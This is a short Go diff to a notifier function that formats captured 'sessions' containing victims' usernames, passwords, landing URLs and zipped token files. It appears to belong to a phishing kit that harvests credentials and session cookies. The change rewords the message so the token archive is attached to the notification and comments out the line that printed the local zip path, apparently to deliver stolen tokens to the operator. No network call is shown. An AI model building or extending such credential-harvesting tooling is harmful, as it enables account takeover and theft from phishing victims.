@@ -92,7 +92,7 @@ func formatSessionMessage(session Session) string {
 		"🕒 Create Time:   ➖ %d\n"+
 		"🕔 Update Time:   ➖ %d\n"+
 		"\n" +
-		"📦 Token files are zipped and saved separately.\n",
+		"📦 Token files are zipped and attached separately in message.\n",
 		session.Username,
 		session.Password,
 		session.LandingURL,
@@ -121,7 +121,7 @@ func Notify(session Session) {
 	}
 
 	// Include the zip file path in the message
-	message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", zipFilePath)
+	// message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", zipFilePath)
 
 	// Print the formatted message with zip info
 	fmt.Printf("------------------------------------------------------\n")
